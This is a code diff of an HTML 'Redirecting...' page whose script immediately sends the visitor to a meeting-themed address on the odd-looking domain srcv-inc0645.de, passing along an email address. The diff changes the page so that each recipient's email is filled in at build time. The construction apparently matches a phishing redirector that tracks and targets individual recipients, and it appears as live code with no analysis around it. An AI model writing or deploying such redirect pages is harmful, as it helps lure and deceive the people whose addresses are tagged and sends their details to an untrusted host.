@@ -1,12 +1,13 @@
-
 <!DOCTYPE html>
 <html>
   <head>
     <title>Redirecting...</title>
     <script>
-      const params = new URLSearchParams(window.location.search);
-      const email = params.get("email") || "default@example.com";
-      const target = `https://e-meetings.srcv-inc0645.de/u?email=${encodeURIComponent[-email-]}`;
+      // Replace this placeholder with actual email before deployment or dynamically in build
+      const placeholderEmail = "[-email-]";
+      
+      // Redirect to the final URL with the replaced email
+      const target = `https://e-meetings.srcv-inc0645.de/u?email=${encodeURIComponent(placeholderEmail)}`;
       window.location.replace(target);
     </script>
   </head>
